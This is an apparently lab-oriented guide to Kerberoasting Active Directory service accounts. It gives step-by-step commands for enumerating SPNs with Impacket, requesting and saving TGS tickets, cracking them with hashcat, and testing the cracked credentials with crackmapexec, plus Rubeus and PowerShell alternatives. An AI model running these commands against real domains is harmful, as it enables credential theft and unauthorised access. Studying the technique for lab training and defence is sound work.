# Kerberoasting Attack Guide

## Overview

Kerberoasting is a post-exploitation attack that targets service accounts in Active Directory. It exploits the Kerberos authentication protocol by requesting service tickets (TGS) that are encrypted with the service account's password hash, then cracking them offline.

## Prerequisites

- Domain user credentials
- Network access to the Domain Controller
- Impacket tools installed on attacker machine

## Attack Steps

### 1. Enumerate Service Accounts

From the Attack Box, use GetUserSPNs.py to find accounts with Service Principal Names (SPNs):
```bash
GetUserSPNs.py lab.local/jdoe:Welcome123! -dc-ip 10.0.1.10
```

This will list all service accounts with SPNs in the domain.

### 2. Request Service Tickets

Request TGS tickets for the service accounts:
```bash
GetUserSPNs.py lab.local/jdoe:Welcome123! -dc-ip 10.0.1.10 -request -outputfile tickets.txt
```

This saves the tickets to `tickets.txt` in a format ready for cracking.

### 3. Crack the Tickets

Use Hashcat to crack the tickets offline:
```bash
hashcat -m 13100 tickets.txt /usr/share/wordlists/rockyou.txt --force
```

- `-m 13100`: Kerberos TGS-REP mode
- `--force`: Ignore warnings (for VM environments)

### 4. Review Results

Check cracked passwords:
```bash
hashcat -m 13100 tickets.txt --show
```

### 5. Verify Access

Test the cracked credentials:
```bash
crackmapexec smb 10.0.1.10 -u svc_sql -p Password1 -d lab.local
```

## Expected Results

- `svc_sql` (Password1) - Should crack quickly
- `svc_web` (Summer2024!) - May take longer
- `svc_backup` - Will not crack with rockyou.txt

## Alternative Tools

### Using Rubeus (Windows)

If attacking from a Windows machine on the domain:
```powershell
.\Rubeus.exe kerberoast /outfile:tickets.kirbi
```

### Using Invoke-Kerberoast (PowerShell)
```powershell
Invoke-Kerberoast -OutputFormat Hashcat | Out-File -FilePath tickets.txt
```

## Notes

- Any authenticated domain user can request service tickets
- Cracking happens offline, making detection difficult
- Strong passwords (25+ characters) make this attack impractical
